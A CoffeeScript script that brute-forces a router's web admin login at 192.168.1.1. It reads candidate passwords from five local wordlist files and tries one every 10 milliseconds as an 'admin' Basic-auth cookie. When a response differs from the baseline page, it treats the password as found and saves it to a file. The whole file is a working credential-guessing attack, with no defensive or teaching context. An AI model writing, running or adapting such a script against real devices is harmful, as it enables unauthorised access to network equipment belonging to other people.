req = require 'request'
rou = require './router'
fs = require 'fs'

data=[]
data=data.concat(JSON.parse(fs.readFileSync('./rkolin.js'))['data'])
data=data.concat(JSON.parse(fs.readFileSync('./rkolin1.js'))['data'])
data=data.concat(JSON.parse(fs.readFileSync('./rkolin2.js'))['data'])
data=data.concat(JSON.parse(fs.readFileSync('./rkolin3.js'))['data'])
data=data.concat(JSON.parse(fs.readFileSync('./rkolin4.js'))['data'])

url = 'http://192.168.1.1';

req(url, (error, response, body)->
    if (!error && response.statusCode == 200)
        #console.log body
        f=->
            n=11000
            page=body[-2000..-1]
            fs.writeFileSync('page.html',page) 
            main = ->                   
                psw=data[n++]
                #console.log data[n]
                if 6<psw.length<15
                    j = req.jar()
                    auth = "Basic "+rou.Base64Encoding("admin:"+psw)            
                    cookie = req.cookie("Authorization="+escape(auth)+";path=/")
                    j.setCookie(cookie, url)        
                    req({'url': url, 'jar': j},(error, response, bd)->
                        bd=bd[-2000..-1]
                        if bd != page
                            console.log psw+'  iiiiiiiiiii'                            
                            fs.writeFileSync('psw.txt', psw)
                            ddd
                        else
                            #fs.writeFileSync('next.html',bd) 
                            console.log n                            
                    )
            return main

        closure=f()
            
        setInterval(closure,10)
)
            



